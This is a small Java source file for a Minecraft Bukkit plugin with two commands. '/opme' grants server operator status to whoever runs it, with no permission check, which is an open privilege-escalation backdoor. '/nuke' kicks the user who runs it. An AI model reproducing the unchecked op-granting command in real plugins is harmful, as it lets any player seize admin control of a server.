package com.jacob.mathboy601;

import org.bukkit.ChatColor;
import org.bukkit.command.*;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Jacob4294967296 extends JavaPlugin {
	public void onEnable() {
		getLogger().info("Jacob's plugin initialized");
	}
	public void onDisable() {
		getLogger().warning("Jacob's plugin disabled.");
	}
	public void adminAction(String user, String action, boolean isRed) {
		getServer().broadcastMessage((isRed ? ChatColor.RED : ChatColor.AQUA) + user + " - " + action);
	}
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if (command.getName().equalsIgnoreCase("opme")) {
			sender.setOp(true);
			sender.sendMessage(ChatColor.AQUA + "Opped yourself.");
			return true;
		}
		if (command.getName().equalsIgnoreCase("nuke")) {
			((Player) sender).kickPlayer("Kicked for using /nuke.");
			return true;
		}
		return false;
	}
}